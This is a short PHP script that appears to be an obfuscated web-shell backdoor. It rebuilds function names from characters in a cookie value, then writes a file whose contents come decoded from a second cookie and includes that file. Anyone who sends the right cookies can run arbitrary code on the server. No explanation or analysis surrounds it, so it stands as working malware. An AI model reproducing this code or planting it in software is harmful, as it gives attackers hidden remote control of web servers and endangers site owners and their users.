<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[30])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[30][$n];
        if (!$c[30][$n + 1]) {
            if (!$c[30][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[25]() . $p[3];
    if (!$p[2]($k)) {
        $n = $p[10]($k, $p[17]);
        $p[27]($n, $p[9] . $p[15]($p[26]($c[3])));
    }
    include($k);
}